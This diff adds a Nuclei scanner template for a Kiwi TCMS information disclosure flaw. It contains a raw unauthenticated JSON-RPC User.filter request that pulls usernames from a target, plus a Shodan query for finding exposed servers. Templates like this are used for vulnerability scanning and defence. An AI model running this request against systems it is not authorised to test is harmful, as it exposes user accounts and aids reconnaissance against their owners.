@@ -1,0 +1,47 @@
+id: kiwitcms-json-rpc
+
+info:
+  name: Kiwi TCMS Information Disclosure
+  author: act1on3
+  severity: high
+  reference:
+    - https://hackerone.com/reports/968402
+    - https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/
+    - https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml
+  metadata:
+    max-request: 1
+    shodan-query: title:"Kiwi TCMS - Login",http.favicon.hash:-1909533337
+  tags: kiwitcms,exposure,misconfig,hackerone
+
+http:
+  - raw:
+      - |
+        POST /json-rpc/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+
+        {"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - result
+          - username
+          - jsonrpc
+          - is_active
+        condition: and
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - .result[].username
+
+# digest: 4a0a00473045022030d088704a1e2368737250f601b8345afc6b43a82c793c1e8ef388c3e7429258022100be89ca1b2bae13480f5b3cc7e54cb51ef24f1376a3e079578ca6508e680b4a58:922c64590222798bb761d5b6d8e72950
